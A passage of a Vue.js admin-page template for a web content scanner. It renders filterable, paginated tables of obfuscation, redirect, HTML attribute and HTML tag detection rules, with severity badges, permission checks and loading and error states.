                <option value="-pattern">Pattern (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model.number="obfuscationPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Filters Button -->
              <UiButton 
                variant="ghost" 
                size="sm" 
                @click="resetObfuscationFilters" 
                class="h-9 px-2.5 text-xs text-muted-foreground hover:text-foreground"
                title="Reset filters"
              >
                <RotateCcw class="w-3.5 h-3.5" />
              </UiButton>
            </div>
          </div>
        </div>

        <!-- Table Container with Loading & Error States -->
        <div class="relative">
          <!-- Loading State Overlay -->
          <div 
            v-if="isObfuscationLoading" 
            class="p-12 bg-card/80 backdrop-blur-xs border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
          >
            <Loader2 class="w-6 h-6 animate-spin text-primary" />
            <p class="text-xs font-semibold text-muted-foreground">Loading obfuscation rules...</p>
          </div>

          <!-- Error State -->
          <div 
            v-else-if="obfuscationError" 
            class="p-8 bg-rose-500/10 border border-rose-500/30 rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
          >
            <AlertOctagon class="w-8 h-8 text-rose-500" />
            <div class="space-y-1">
              <p class="text-sm font-bold text-foreground">Failed to Load Obfuscation Rules</p>
              <p class="text-xs text-rose-600 dark:text-rose-400">{{ obfuscationError }}</p>
            </div>
            <UiButton size="sm" variant="outline" @click="fetchObfuscationRules" class="border-rose-500/40 hover:bg-rose-500/10">
              <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
              <span>Retry</span>
            </UiButton>
          </div>

          <!-- Real Data Table -->
          <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
            <UiTable 
              :data="obfuscationRulesData" 
              :columns="obfuscationRuleColumns"
              empty-message="No obfuscation rules match your filters."
            >
              <!-- Pattern Cell -->
              <template #cell-pattern="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.pattern }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewObfuscation"
                    @click.stop="openObfuscationViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View obfuscation rule details"
                    aria-label="View obfuscation rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditObfuscationRule"
                    @click.stop="openEditObfuscationRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit obfuscation rule"
                    aria-label="Edit obfuscation rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteObfuscationRule"
                    @click.stop="openDeleteObfuscationRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete obfuscation rule"
                    aria-label="Delete obfuscation rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="obfuscationRulesCount > 0"
              :current-page="obfuscationPage"
              :total-pages="obfuscationRulesPages"
              :total-count="obfuscationRulesCount"
              :items-per-page="obfuscationPageSize"
              item-label="obfuscation rules"
              @update:current-page="obfuscationPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Redirect Rules Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'redirects'" class="space-y-4">
        <!-- Permission Alert -->
        <div v-if="!canViewRedirects" class="p-6 bg-card border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center">
          <ShieldAlert class="w-8 h-8 text-amber-500" />
          <div class="space-y-1">
            <p class="text-sm font-bold text-foreground">Access Restricted</p>
            <p class="text-xs text-muted-foreground">You do not have permission to view redirect detection rules.</p>
          </div>
        </div>

        <div v-else class="space-y-4">
          <!-- Redirect Rules Filters Toolbar -->
          <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
            <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
              <!-- Search Box -->
              <div class="relative flex-1">
                <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
                <input 
                  v-model="redirectSearchQuery"
                  type="text" 
                  placeholder="Search redirect patterns..." 
                  class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
                />
                <button 
                  v-if="redirectSearchQuery" 
                  @click="redirectSearchQuery = ''"
                  class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                >
                  <X class="w-3.5 h-3.5" />
                </button>
              </div>

              <!-- Filters Dropdowns Row -->
              <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
                <!-- Category Filter -->
                <select 
                  v-model="redirectCategory"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Categories</option>
                  <option value="ADULT">Adult</option>
                  <option value="DRUG">Drug</option>
                  <option value="GAMBLING">Gambling</option>
                  <option value="HIDDEN_CONTENT">Hidden Content</option>
                  <option value="INJECTION">Injection</option>
                  <option value="MALWARE">Malware</option>
                  <option value="OBFUSCATION">Obfuscation</option>
                  <option value="PHISHING">Phishing</option>
                  <option value="REDIRECT">Redirect</option>
                  <option value="SCAM">Scam</option>
                  <option value="SPAM">Spam</option>
                </select>

                <!-- Severity Filter -->
                <select 
                  v-model="redirectSeverity"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Severities</option>
                  <option value="CRITICAL">Critical</option>
                  <option value="HIGH">High</option>
                  <option value="MEDIUM">Medium</option>
                  <option value="LOW">Low</option>
                  <option value="INFO">Info</option>
                </select>

                <!-- Active Filter -->
                <select 
                  v-model="redirectIsActive"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Active Status</option>
                  <option value="true">Active Only</option>
                  <option value="false">Inactive Only</option>
                </select>

                <!-- Enabled Filter -->
                <select 
                  v-model="redirectIsEnabled"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Enabled Status</option>
                  <option value="true">Enabled Only</option>
                  <option value="false">Disabled Only</option>
                </select>

                <!-- Ordering Filter -->
                <select 
                  v-model="redirectOrdering"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="-created_at">Newest First</option>
                  <option value="created_at">Oldest First</option>
                  <option value="pattern">Pattern (A-Z)</option>
                  <option value="-pattern">Pattern (Z-A)</option>
                </select>

                <!-- Page Size Selector -->
                <div class="flex items-center gap-1.5 border-l border-border pl-2">
                  <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                  <select 
                    v-model.number="redirectPageSize"
                    class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                  >
                    <option :value="5">5 / page</option>
                    <option :value="10">10 / page</option>
                    <option :value="25">25 / page</option>
                    <option :value="50">50 / page</option>
                    <option :value="100">100 / page</option>
                  </select>
                </div>

                <!-- Reset Filters Button -->
                <UiButton 
                  variant="ghost" 
                  size="sm" 
                  @click="resetRedirectFilters" 
                  class="h-9 px-2.5 text-xs text-muted-foreground hover:text-foreground"
                  title="Reset filters"
                >
                  <RotateCcw class="w-3.5 h-3.5" />
                </UiButton>
              </div>
            </div>
          </div>

          <!-- Table Container with Loading & Error States -->
          <div class="relative">
            <!-- Loading State Overlay -->
            <div 
              v-if="isRedirectsLoading" 
              class="p-12 bg-card/80 backdrop-blur-xs border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <Loader2 class="w-6 h-6 animate-spin text-primary" />
              <p class="text-xs font-semibold text-muted-foreground">Loading redirect rules...</p>
            </div>

            <!-- Error State -->
            <div 
              v-else-if="redirectsError" 
              class="p-8 bg-rose-500/10 border border-rose-500/30 rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <AlertOctagon class="w-8 h-8 text-rose-500" />
              <div class="space-y-1">
                <p class="text-sm font-bold text-foreground">Failed to Load Redirect Rules</p>
                <p class="text-xs text-rose-600 dark:text-rose-400">{{ redirectsError }}</p>
              </div>
              <UiButton size="sm" variant="outline" @click="fetchRedirectRules" class="border-rose-500/40 hover:bg-rose-500/10">
                <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
                <span>Retry</span>
              </UiButton>
            </div>

            <!-- Real Data Table -->
            <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
              <UiTable 
                :data="redirectRulesData" 
                :columns="redirectRuleColumns"
                empty-message="No redirect rules match your filters."
              >
                <!-- Pattern Cell -->
                <template #cell-pattern="{ item }">
                  <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                    {{ item.pattern }}
                  </span>
                </template>

                <!-- Category Cell -->
                <template #cell-category="{ item }">
                  <span class="text-xs font-semibold text-muted-foreground">
                    {{ item.category }}
                  </span>
                </template>

                <!-- Severity Cell -->
                <template #cell-severity="{ item }">
                  <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                    {{ item.severity }}
                  </span>
                </template>

                <!-- Enabled Cell -->
                <template #cell-is_enabled="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_enabled 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                  </span>
                </template>

                <!-- Active Cell -->
                <template #cell-is_active="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_active 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                  </span>
                </template>

                <!-- Created At Cell -->
                <template #cell-created_at="{ item }">
                  <span class="text-xs text-muted-foreground font-mono">
                    {{ formatDate(item.created_at) }}
                  </span>
                </template>

                <!-- Actions Cell -->
                <template #cell-actions="{ item }">
                  <div class="flex items-center justify-end gap-1.5">
                    <button 
                      v-if="canViewRedirects"
                      @click.stop="openRedirectViewModal(item.id)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                      title="View redirect rule details"
                      aria-label="View redirect rule details"
                    >
                      <Eye class="w-4 h-4" />
                    </button>
                    <button 
                      v-if="canEditRedirectRule"
                      @click.stop="openEditRedirectRuleModal(item.id)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                      title="Edit redirect rule"
                      aria-label="Edit redirect rule"
                    >
                      <Edit3 class="w-4 h-4" />
                    </button>
                    <button 
                      v-if="canDeleteRedirectRule"
                      @click.stop="openDeleteRedirectRuleModal(item)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-rose-600 hover:bg-rose-50 dark:hover:bg-rose-950/30 transition-colors cursor-pointer"
                      title="Delete redirect rule"
                      aria-label="Delete redirect rule"
                    >
                      <Trash2 class="w-4 h-4" />
                    </button>
                  </div>
                </template>
              </UiTable>

              <!-- Pagination Controls -->
              <UiPagination 
                v-if="redirectRulesCount > 0"
                :current-page="redirectPage"
                :total-pages="redirectRulesPages"
                :total-count="redirectRulesCount"
                :items-per-page="redirectPageSize"
                item-label="redirect rules"
                @update:current-page="redirectPage = $event"
              />
            </div>
          </div>
        </div>
      </div>

      <!-- HTML Attribute Rules Subtab -->
      <div v-else-if="rulesSubTab === 'attributes'" class="space-y-4">
        <!-- Permission Alert -->
        <div v-if="!canViewHtmlAttributeRules" class="p-6 bg-card border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center">
          <ShieldAlert class="w-8 h-8 text-amber-500" />
          <div class="space-y-1">
            <p class="text-sm font-bold text-foreground">Access Restricted</p>
            <p class="text-xs text-muted-foreground">You do not have permission to view HTML attribute rules.</p>
          </div>
        </div>

        <div v-else class="space-y-4">
          <!-- HTML Attribute Rules Filters Toolbar -->
          <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
            <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
              <!-- Search Box -->
              <div class="relative flex-1">
                <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
                <input 
                  v-model="htmlAttributeSearchQuery"
                  type="text" 
                  placeholder="Search HTML attributes..." 
                  class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
                />
                <button 
                  v-if="htmlAttributeSearchQuery" 
                  @click="htmlAttributeSearchQuery = ''"
                  class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                >
                  <X class="w-3.5 h-3.5" />
                </button>
              </div>

              <!-- Filters Dropdowns Row -->
              <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
                <!-- Category Filter -->
                <select 
                  v-model="htmlAttributeCategory"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Categories</option>
                  <option value="ADULT">Adult</option>
                  <option value="DRUG">Drug</option>
                  <option value="GAMBLING">Gambling</option>
                  <option value="HIDDEN_CONTENT">Hidden Content</option>
                  <option value="INJECTION">Injection</option>
                  <option value="MALWARE">Malware</option>
                  <option value="OBFUSCATION">Obfuscation</option>
                  <option value="PHISHING">Phishing</option>
                  <option value="REDIRECT">Redirect</option>
                  <option value="SCAM">Scam</option>
                  <option value="SPAM">Spam</option>
                </select>

                <!-- Severity Filter -->
                <select 
                  v-model="htmlAttributeSeverity"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Severities</option>
                  <option value="CRITICAL">Critical</option>
                  <option value="HIGH">High</option>
                  <option value="MEDIUM">Medium</option>
                  <option value="LOW">Low</option>
                  <option value="INFO">Info</option>
                </select>

                <!-- Active Filter -->
                <select 
                  v-model="htmlAttributeIsActive"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Active Status</option>
                  <option value="true">Active Only</option>
                  <option value="false">Inactive Only</option>
                </select>

                <!-- Enabled Filter -->
                <select 
                  v-model="htmlAttributeIsEnabled"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Enabled Status</option>
                  <option value="true">Enabled Only</option>
                  <option value="false">Disabled Only</option>
                </select>

                <!-- Ordering Filter -->
                <select 
                  v-model="htmlAttributeOrdering"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="-created_at">Newest First</option>
                  <option value="created_at">Oldest First</option>
                  <option value="attribute">Attribute (A-Z)</option>
                  <option value="-attribute">Attribute (Z-A)</option>
                </select>

                <!-- Page Size Selector -->
                <div class="flex items-center gap-1.5 border-l border-border pl-2">
                  <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                  <select 
                    v-model.number="htmlAttributePageSize"
                    class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                  >
                    <option :value="5">5 / page</option>
                    <option :value="10">10 / page</option>
                    <option :value="25">25 / page</option>
                    <option :value="50">50 / page</option>
                    <option :value="100">100 / page</option>
                  </select>
                </div>

                <!-- Reset Filters Button -->
                <UiButton 
                  variant="ghost" 
                  size="sm" 
                  @click="resetHtmlAttributeFilters" 
                  class="h-9 px-2.5 text-xs text-muted-foreground hover:text-foreground"
                  title="Reset filters"
                >
                  <RotateCcw class="w-3.5 h-3.5" />
                </UiButton>
              </div>
            </div>
          </div>

          <!-- Table Container with Loading & Error States -->
          <div class="relative">
            <!-- Loading State Overlay -->
            <div 
              v-if="isHtmlAttributeLoading" 
              class="p-12 bg-card/80 backdrop-blur-xs border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <Loader2 class="w-6 h-6 animate-spin text-primary" />
              <p class="text-xs font-semibold text-muted-foreground">Loading HTML attribute rules...</p>
            </div>

            <!-- Error State -->
            <div 
              v-else-if="htmlAttributeError" 
              class="p-8 bg-rose-500/10 border border-rose-500/30 rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <AlertOctagon class="w-8 h-8 text-rose-500" />
              <div class="space-y-1">
                <p class="text-sm font-bold text-foreground">Failed to Load HTML Attribute Rules</p>
                <p class="text-xs text-rose-600 dark:text-rose-400">{{ htmlAttributeError }}</p>
              </div>
              <UiButton size="sm" variant="outline" @click="fetchHtmlAttributeRules" class="border-rose-500/40 hover:bg-rose-500/10">
                <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
                <span>Retry</span>
              </UiButton>
            </div>

            <!-- Real Data Table -->
            <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
              <UiTable 
                :data="htmlAttributeRulesData" 
                :columns="htmlAttributeRuleColumns"
                empty-message="No HTML attribute rules match your filters."
              >
                <!-- Attribute Cell -->
                <template #cell-attribute="{ item }">
                  <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                    {{ item.attribute || item.pattern }}
                  </span>
                </template>

                <!-- Category Cell -->
                <template #cell-category="{ item }">
                  <span class="text-xs font-semibold text-muted-foreground">
                    {{ item.category }}
                  </span>
                </template>

                <!-- Severity Cell -->
                <template #cell-severity="{ item }">
                  <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                    {{ item.severity }}
                  </span>
                </template>

                <!-- Enabled Cell -->
                <template #cell-is_enabled="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_enabled 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                  </span>
                </template>

                <!-- Active Cell -->
                <template #cell-is_active="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_active 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                  </span>
                </template>

                <!-- Created At Cell -->
                <template #cell-created_at="{ item }">
                  <span class="text-xs text-muted-foreground font-mono">
                    {{ formatDate(item.created_at) }}
                  </span>
                </template>

                <!-- Actions Cell -->
                <template #cell-actions="{ item }">
                  <div class="flex items-center justify-end gap-1.5">
                    <button 
                      v-if="canViewHtmlAttributeRules"
                      @click.stop="openHtmlAttributeViewModal(item.id)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                      title="View HTML attribute rule details"
                      aria-label="View HTML attribute rule details"
                    >
                      <Eye class="w-4 h-4" />
                    </button>
                    <button 
                      v-if="canEditHtmlAttributeRule"
                      @click.stop="openEditHtmlAttributeRuleModal(item.id)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                      title="Edit HTML attribute rule"
                      aria-label="Edit HTML attribute rule"
                    >
                      <Edit3 class="w-4 h-4" />
                    </button>
                    <button 
                      v-if="canDeleteHtmlAttributeRule"
                      @click.stop="openDeleteHtmlAttributeRuleModal(item)"
                      class="p-1.5 rounded-lg text-muted-foreground hover:text-rose-600 hover:bg-rose-50 dark:hover:bg-rose-950/30 transition-colors cursor-pointer"
                      title="Delete HTML attribute rule"
                      aria-label="Delete HTML attribute rule"
                    >
                      <Trash2 class="w-4 h-4" />
                    </button>
                  </div>
                </template>
              </UiTable>

              <!-- Pagination Controls -->
              <UiPagination 
                v-if="htmlAttributeRulesCount > 0"
                :current-page="htmlAttributePage"
                :total-pages="htmlAttributeRulesPages"
                :total-count="htmlAttributeRulesCount"
                :items-per-page="htmlAttributePageSize"
                item-label="attribute rules"
                @update:current-page="htmlAttributePage = $event"
              />
            </div>
          </div>
        </div>
      </div>

      <!-- HTML Tag Rules Subtab -->
      <div v-else-if="rulesSubTab === 'html'" class="space-y-4">
        <!-- Permission Alert -->
        <div v-if="!canViewHtmlTagRules" class="p-6 bg-card border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center">
          <ShieldAlert class="w-8 h-8 text-amber-500" />
          <div class="space-y-1">
            <p class="text-sm font-bold text-foreground">Access Restricted</p>
            <p class="text-xs text-muted-foreground">You do not have permission to view HTML tag rules.</p>
          </div>
        </div>

        <div v-else class="space-y-4">
          <!-- HTML Tag Rules Filters Toolbar -->
          <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
            <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
              <!-- Search Box -->
              <div class="relative flex-1">
                <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
                <input 
                  v-model="htmlTagSearchQuery"
                  type="text" 
                  placeholder="Search HTML tags..." 
                  class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
                />
                <button 
                  v-if="htmlTagSearchQuery" 
                  @click="htmlTagSearchQuery = ''"
                  class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                >
                  <X class="w-3.5 h-3.5" />
                </button>
              </div>

              <!-- Filters Dropdowns Row -->
              <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
                <!-- Category Filter -->
                <select 
                  v-model="htmlTagCategory"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Categories</option>
                  <option value="ADULT">Adult</option>
                  <option value="DRUG">Drug</option>
                  <option value="GAMBLING">Gambling</option>
                  <option value="HIDDEN_CONTENT">Hidden Content</option>
                  <option value="DANGEROUS_TAGS">Dangerous Tags</option>
                  <option value="EMBEDDED_CONTENT">Embedded Content</option>
                  <option value="PLUGIN_OBJECTS">Plugin Objects</option>
                  <option value="DOM_HIJACKING">DOM Hijacking</option>
                  <option value="INJECTION">Injection</option>
                  <option value="MALWARE">Malware</option>
                  <option value="OBFUSCATION">Obfuscation</option>
                  <option value="PHISHING">Phishing</option>
                  <option value="REDIRECT">Redirect</option>
                  <option value="SCAM">Scam</option>
                  <option value="SPAM">Spam</option>
                </select>

                <!-- Severity Filter -->
                <select 
                  v-model="htmlTagSeverity"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Severities</option>
                  <option value="CRITICAL">Critical</option>
                  <option value="HIGH">High</option>
                  <option value="MEDIUM">Medium</option>
                  <option value="LOW">Low</option>
                  <option value="INFO">Info</option>
                </select>

                <!-- Active Filter -->
                <select 
                  v-model="htmlTagIsActive"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Active Status</option>
                  <option value="true">Active Only</option>
                  <option value="false">Inactive Only</option>
                </select>

                <!-- Enabled Filter -->
                <select 
                  v-model="htmlTagIsEnabled"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Enabled Status</option>
                  <option value="true">Enabled Only</option>
                  <option value="false">Disabled Only</option>
                </select>

                <!-- Ordering Filter -->
                <select 
                  v-model="htmlTagOrdering"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="-created_at">Newest First</option>
                  <option value="created_at">Oldest First</option>
                  <option value="tag">Tag (A-Z)</option>
                  <option value="-tag">Tag (Z-A)</option>
                </select>

                <!-- Page Size Selector -->
                <div class="flex items-center gap-1.5 border-l border-border pl-2">
                  <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                  <select 
                    v-model.number="htmlTagPageSize"
                    class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                  >
                    <option :value="5">5 / page</option>
                    <option :value="10">10 / page</option>
                    <option :value="25">25 / page</option>
                    <option :value="50">50 / page</option>
                    <option :value="100">100 / page</option>
                  </select>
                </div>

                <!-- Reset Filters Button -->
                <UiButton 
                  variant="ghost" 
                  size="sm" 
                  @click="resetHtmlTagFilters" 
                  class="h-9 px-2.5 text-xs text-muted-foreground hover:text-foreground"
                  title="Reset filters"
                >
                  <RotateCcw class="w-3.5 h-3.5" />
                </UiButton>
              </div>
            </div>
          </div>

          <!-- Table Container with Loading & Error States -->
          <div class="relative">
            <!-- Loading State Overlay -->
            <div 
              v-if="isHtmlTagLoading" 
              class="p-12 bg-card/80 backdrop-blur-xs border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <Loader2 class="w-6 h-6 animate-spin text-primary" />
              <p class="text-xs font-semibold text-muted-foreground">Loading HTML tag rules...</p>
            </div>

            <!-- Error State -->
            <div 
              v-else-if="htmlTagError" 
